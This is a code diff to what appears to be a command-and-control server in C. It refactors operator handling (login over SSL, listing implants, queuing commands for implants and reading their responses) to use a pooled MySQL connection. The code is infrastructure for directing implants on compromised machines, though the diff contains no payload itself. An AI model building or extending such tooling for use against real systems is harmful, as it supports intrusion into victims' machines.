@@ -32,7 +32,7 @@
 
 char USERNAME[0x100];
 
-int autheticate(SSL *ssl) {
+int autheticate(MYSQL *con, SSL *ssl) {
     char auth[1024];
     int bytes_received = SSL_read(ssl, auth, sizeof(auth));
     if (bytes_received <= 0) {
@@ -74,7 +74,7 @@ int autheticate(SSL *ssl) {
         return -1;
     }
 
-    if (authenticate_operator(username->valuestring, password->valuestring) != 0) {
+    if (authenticate_operator(con, username->valuestring, password->valuestring) != 0) {
         cJSON_AddStringToObject(reply, "authenticated", "false");
         char *reply_ = cJSON_Print(reply);
         //send(sock, reply_, strlen(reply_), 0);
@@ -100,7 +100,7 @@ int autheticate(SSL *ssl) {
     return 0;
 }
 
-char *interact_with_implant(cJSON *rinfo) {
+char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
     if (!rinfo) {
         return strdup("{\"error\": \"Invalid JSON\"}");
     }
@@ -119,7 +119,7 @@ char *interact_with_implant(cJSON *rinfo) {
     if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");
 
     if (strcmp(action_value, "list-tasks") == 0) {
-        snprintf(data, MAX_INFO, "%s", tasks_per_implant(implant_id_value));
+        snprintf(data, MAX_INFO, "%s", tasks_per_implant(con, implant_id_value));
     } 
     else if (strcmp(action_value, "response-task") == 0) {
         cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
@@ -127,7 +127,7 @@ char *interact_with_implant(cJSON *rinfo) {
             free(data);
             return strdup("{\"error\": \"Invalid task_id\"}");
         }
-        char *data_t = cmd_and_response(task->valueint);
+        char *data_t = cmd_and_response(con, task->valueint);
         snprintf(data, MAX_INFO, "%s", data_t);
         free(data_t);
     } 
@@ -137,7 +137,7 @@ char *interact_with_implant(cJSON *rinfo) {
             free(data);
             return strdup("{\"error\": \"Invalid command\"}");
         }
-        new_tasks(implant_id_value, command->valuestring);
+        new_tasks(con, implant_id_value, command->valuestring);
         free(data);
         cJSON *tasks_added = cJSON_CreateObject();
         cJSON_AddStringToObject(tasks_added, "status", "task_added");
@@ -154,21 +154,26 @@ char *interact_with_implant(cJSON *rinfo) {
 
 
 void *operator_handler(void *Args) {
-    //con = mysql_init(NULL);
-    //if (!mysql_real_connect(con, g_dbconf->host, g_dbconf->user, g_dbconf->pass, g_dbconf->db, 0, NULL, 0)) {
-    //    log_message(LOG_ERROR, "Database Connect Error: %s", mysql_error(con));
-    //    return NULL;
-    //}
-//
-    //mysql_thread_init();
-
     struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
     SSL *ssl = args->ssl;
 
+
+    MYSQL *con = get_db_connection();
+
+    if (con == NULL) {
+        log_message(LOG_ERROR, "Failed to get DB connection from pool");
+        return NULL;
+    }
+
+    // Check if connection is still alive
+    if (mysql_ping(con) != 0) {
+        log_message(LOG_WARN, "DB connection lost, reconnecting...");
+        return NULL;
+    }
     // 3 tries
     int try = 1;
     do {
-        if (autheticate(ssl) == 0) {
+        if (autheticate(con, ssl) == 0) {
             goto START;
         } 
         try++;
@@ -207,7 +212,7 @@ void *operator_handler(void *Args) {
         }
 
         if (strncmp(about->valuestring, "Implants", 8) == 0){ // all info about implants
-            char *implants = GetData("Implants");
+            char *implants = GetData(con, "Implants");
             //send(sock, agents, strlen(agents), 0);
             //if (implants == NULL) {
             //    // handle this
@@ -217,12 +222,12 @@ void *operator_handler(void *Args) {
             SSL_write(ssl, implants, strlen(implants));
             free(implants);
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
-            char *tasks = GetData("Tasks");
+            char *tasks = GetData(con, "Tasks");
             //send(sock, tasks, strlen(tasks), 0);
             SSL_write(ssl, tasks, strlen(tasks));
             free(tasks);
         } else if (strcmp(about->valuestring, "implant_id") == 0) {
-            char *data = interact_with_implant(requested_info);
+            char *data = interact_with_implant(con, requested_info);
             if (data == NULL) {
                 //send(sock, "ERROR", strlen("ERROR"), 0);
                 //SSL_write(ssl, reply_, sizeof("ERROR"));    
@@ -241,8 +246,6 @@ void *operator_handler(void *Args) {
     log_message(LOG_INFO, "Closed connection");
     SSL_free(ssl);
 
-    mysql_close(con);
-    //mysql_thread_end();
     return NULL;
 }
 
